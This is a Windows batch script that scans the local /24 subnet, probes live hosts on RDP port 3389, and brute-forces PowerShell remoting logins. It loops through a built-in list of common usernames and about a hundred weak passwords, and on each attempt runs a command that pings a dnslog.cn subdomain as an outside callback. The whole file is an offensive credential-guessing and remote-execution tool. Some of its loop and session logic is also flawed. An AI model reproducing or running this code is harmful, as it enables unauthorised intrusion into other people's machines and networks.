@echo off

set comandforwindows="ping f72l6o.dnslog.cn"

set passwords=("root" "!@" "wubao" "password" "123456" "admin" "12345" "1234" "p@ssw0rd" "123" "1" "jiamima" "test" "root123" "!" "!q@w" "!qaz@wsx" "idc!@" "admin!@" "" "alpine" "qwerty" "12345678" "111111" "123456789" "1q2w3e4r" "123123" "default" "1234567" "qwe123" "1qaz2wsx" "1234567890" "abcd1234" "000000" "user" "toor" "qwer1234" "1q2w3e" "asdf1234" "redhat" "1234qwer" "cisco" "12qwaszx" "test123" "1q2w3e4r5t" "admin123" "changeme" "1qazxsw2" "123qweasd" "q1w2e3r4" "letmein" "server" "root1234" "master" "abc123" "rootroot" "a" "system" "pass" "1qaz2wsx3edc" "p@$$w0rd" "112233" "welcome" "!QAZ2wsx" "linux" "123321" "manager" "1qazXSW@" "q1w2e3r4t5" "oracle" "asd123" "admin123456" "ubnt" "123qwe" "qazwsxedc" "administrator" "superuser" "zaq12wsx" "121212" "654321" "ubuntu" "0000" "zxcvbnm" "root@123" "1111" "vmware" "q1w2e3" "qwerty123" "cisco123" "11111111" "pa55w0rd" "asdfgh" "11111" "123abc" "asdf" "centos" "888888" "54321" "password123" "Administrator")
set usernamesforwin=("root" "system" "admin" "user" "public" "Administrator" "guest" "account")

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr IPv4') do set "internal_ip=%%a"
for /f "tokens=1-3 delims=." %%a in ("%internal_ip%") do set "network_segment=%%a.%%b.%%c"

for /l %%i in (1,1,255) do (
    set "ip_address=%network_segment%.%%i"
    ping -n 1 -w 2000 %ip_address% >nul
    if %errorlevel% equ 0 (
       powershell.exe -Command "& {Test-NetConnection -ComputerName %ip_address% -Port 3389}"
            if %errorlevel% equ 0 (
                for %%u in %usernamesforwin% do (
                    for %%p in %passwords% do (
                        powershell.exe -Command "Enter-PSSession -ComputerName %ip_address% -Credential (New-Object System.Management.Automation.PSCredential('%%u', (ConvertTo-SecureString '%%p' -AsPlainText -Force)))"
                        powershell.exe -Command "Invoke-Command -ComputerName %ip_address% -ScriptBlock { %comandforwindows% }"
                        Exit-PSSession
                    )
                )
            )
    ) else (
        rem 其他操作
    )
)
